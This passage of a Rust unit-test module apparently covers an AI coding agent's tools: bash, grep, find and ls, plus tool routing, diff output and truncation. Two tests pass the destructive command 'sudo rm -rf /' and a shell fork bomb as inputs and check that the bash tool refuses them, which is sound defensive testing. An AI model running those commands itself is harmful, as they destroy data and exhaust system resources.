        assert!(res.is_error);
        assert!(res.output.contains("no edits"));
    }

    // ─── tool_bash ──────────────────────────────────────────────────────

    #[test]
    fn tool_bash_echo() {
        let cwd = temp_workspace("bash-echo");
        let res = run_tool(
            &cwd,
            "bash",
            &json!({"command": "echo hello"}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.output.contains("hello"));
        assert!(res.output.contains("exit code: 0"));
    }

    #[test]
    fn tool_bash_cwd_respected() {
        let cwd = temp_workspace("bash-cwd");
        let res = run_tool(
            &cwd,
            "bash",
            &json!({"command": "pwd"}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        let canonical = cwd.canonicalize().unwrap();
        assert!(res.output.contains(canonical.to_str().unwrap()));
    }

    #[test]
    fn tool_bash_denied_sudo() {
        let cwd = temp_workspace("bash-sudo");
        let res = run_tool(
            &cwd,
            "bash",
            &json!({"command": "sudo rm -rf /"}),
            &all_enabled(),
        );
        assert!(res.is_error);
        assert!(res.output.contains("Refusing"));
    }

    #[test]
    fn tool_bash_denied_fork_bomb() {
        let cwd = temp_workspace("bash-fork");
        let res = run_tool(
            &cwd,
            "bash",
            &json!({"command": ":(){ :|:& };:"}),
            &all_enabled(),
        );
        assert!(res.is_error);
        assert!(res.output.contains("Refusing"));
    }

    #[test]
    fn tool_bash_timeout() {
        let cwd = temp_workspace("bash-timeout");
        let res = run_tool(
            &cwd,
            "bash",
            &json!({"command": "sleep 60", "timeout": 0.3}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.output.contains("timeout"));
    }

    #[test]
    fn tool_bash_missing_command() {
        let cwd = temp_workspace("bash-no-cmd");
        let res = run_tool(&cwd, "bash", &json!({}), &all_enabled());
        assert!(res.is_error);
        assert!(res.output.contains("missing command"));
    }

    #[test]
    fn tool_bash_nonzero_exit() {
        let cwd = temp_workspace("bash-exit");
        let res = run_tool(
            &cwd,
            "bash",
            &json!({"command": "exit 42"}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.output.contains("exit code: 42"));
    }

    // ─── tool_grep ──────────────────────────────────────────────────────

    #[test]
    fn tool_grep_finds_match() {
        let cwd = temp_workspace("grep-match");
        fs::write(cwd.join("a.txt"), "apple\nbanana\ncherry").unwrap();
        let res = run_tool(
            &cwd,
            "grep",
            &json!({"pattern": "banana"}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.output.contains("banana"));
        assert!(res.output.contains("a.txt:2"));
    }

    #[test]
    fn tool_grep_no_match() {
        let cwd = temp_workspace("grep-no-match");
        fs::write(cwd.join("a.txt"), "hello\n").unwrap();
        let res = run_tool(
            &cwd,
            "grep",
            &json!({"pattern": "zzz"}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.output.contains("No matches"));
    }

    #[test]
    fn tool_grep_specific_file() {
        let cwd = temp_workspace("grep-file");
        fs::write(cwd.join("a.txt"), "alpha\n").unwrap();
        fs::write(cwd.join("b.txt"), "beta\n").unwrap();
        let res = run_tool(
            &cwd,
            "grep",
            &json!({"pattern": "alpha", "path": "a.txt"}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.output.contains("alpha"));
    }

    #[test]
    fn tool_grep_with_limit() {
        let cwd = temp_workspace("grep-limit");
        let content: String = (1..=50).map(|i| format!("match {i}")).collect::<Vec<_>>().join("\n");
        fs::write(cwd.join("big.txt"), &content).unwrap();
        let res = run_tool(
            &cwd,
            "grep",
            &json!({"pattern": "match", "limit": 5}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.output.contains("match limit 5 reached"));
    }

    #[test]
    fn tool_grep_missing_pattern() {
        let cwd = temp_workspace("grep-no-pattern");
        let res = run_tool(&cwd, "grep", &json!({}), &all_enabled());
        assert!(res.is_error);
    }

    // ─── tool_find ──────────────────────────────────────────────────────

    #[test]
    fn tool_find_glob() {
        let cwd = temp_workspace("find-glob");
        fs::write(cwd.join("a.rs"), "").unwrap();
        fs::write(cwd.join("b.txt"), "").unwrap();
        let res = run_tool(
            &cwd,
            "find",
            &json!({"pattern": "*.rs"}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.output.contains("a.rs"));
        assert!(!res.output.contains("b.txt"));
    }

    #[test]
    fn tool_find_missing_pattern() {
        let cwd = temp_workspace("find-no-pattern");
        let res = run_tool(&cwd, "find", &json!({}), &all_enabled());
        assert!(res.is_error);
    }

    // ─── tool_ls ────────────────────────────────────────────────────────

    #[test]
    fn tool_ls_basic() {
        let cwd = temp_workspace("ls-basic");
        fs::write(cwd.join("file1.txt"), "").unwrap();
        fs::write(cwd.join("file2.txt"), "").unwrap();
        fs::create_dir(cwd.join("subdir")).unwrap();
        let res = run_tool(&cwd, "ls", &json!({}), &all_enabled());
        assert!(!res.is_error);
        assert!(res.output.contains("file1.txt"));
        assert!(res.output.contains("file2.txt"));
        assert!(res.output.contains("subdir"));
    }

    #[test]
    fn tool_ls_empty_dir() {
        let cwd = temp_workspace("ls-empty");
        let sub = cwd.join("empty");
        fs::create_dir(&sub).unwrap();
        let res = run_tool(&cwd, "ls", &json!({"path": "empty"}), &all_enabled());
        assert!(!res.is_error);
        assert!(res.output.contains("[empty directory]"));
    }

    #[test]
    fn tool_ls_with_limit() {
        let cwd = temp_workspace("ls-limit");
        for i in 0..10 {
            fs::write(cwd.join(format!("file{i:02}.txt")), "").unwrap();
        }
        let res = run_tool(&cwd, "ls", &json!({"limit": 3}), &all_enabled());
        assert!(!res.is_error);
        assert!(res.output.contains("limit 3 reached"));
    }

    // ─── run_tool routing ───────────────────────────────────────────────

    #[test]
    fn run_tool_unknown_tool() {
        let cwd = temp_workspace("unknown");
        let res = run_tool(&cwd, "destroy", &json!({}), &all_enabled());
        assert!(res.is_error);
        assert!(res.output.contains("Unknown tool"));
    }

    #[test]
    fn run_tool_disabled_tool() {
        let cwd = temp_workspace("disabled");
        let mut enabled = all_enabled();
        enabled[0] = false; // disable "read"
        let res = run_tool(&cwd, "read", &json!({"path": "x"}), &enabled);
        assert!(res.is_error);
        assert!(res.output.contains("disabled"));
    }

    // ─── tool_definitions_json ──────────────────────────────────────────

    #[test]
    fn tool_definitions_all_enabled() {
        let defs = tool_definitions_json(&all_enabled());
        assert_eq!(defs.len(), 7);
        let names: Vec<&str> = defs
            .iter()
            .filter_map(|d| d.get("function")?.get("name")?.as_str())
            .collect();
        assert!(names.contains(&"read"));
        assert!(names.contains(&"bash"));
        assert!(names.contains(&"ls"));
    }

    #[test]
    fn tool_definitions_some_disabled() {
        let mut enabled = [false; 7];
        enabled[0] = true; // only "read"
        let defs = tool_definitions_json(&enabled);
        assert_eq!(defs.len(), 1);
    }

    // ─── make_unified_diff ──────────────────────────────────────────────

    #[test]
    fn unified_diff_empty_for_identical() {
        let diff = make_unified_diff("f.txt", "hello", "hello");
        assert!(diff.is_empty());
    }

    #[test]
    fn unified_diff_shows_changes() {
        let diff = make_unified_diff("f.txt", "line1\nline2\nline3", "line1\nchanged\nline3");
        assert!(diff.contains("-line2"));
        assert!(diff.contains("+changed"));
        assert!(diff.contains("--- a/f.txt"));
        assert!(diff.contains("+++ b/f.txt"));
    }

    #[test]
    fn unified_diff_new_file() {
        let diff = make_unified_diff("new.txt", "", "new content\nsecond line");
        assert!(diff.contains("+new content"));
        assert!(diff.contains("+second line"));
    }

    // ─── truncate_out ───────────────────────────────────────────────────

    #[test]
    fn truncate_out_short_unchanged() {
        let s = "short".to_string();
        assert_eq!(truncate_out(s.clone()), s);
    }

    #[test]
    fn truncate_out_long_capped() {
        let s = "x".repeat(MAX_TOOL_OUTPUT_CHARS + 100);
        let truncated = truncate_out(s);
        assert!(truncated.len() < MAX_TOOL_OUTPUT_CHARS + 200);
        assert!(truncated.contains("[output truncated"));
    }
}
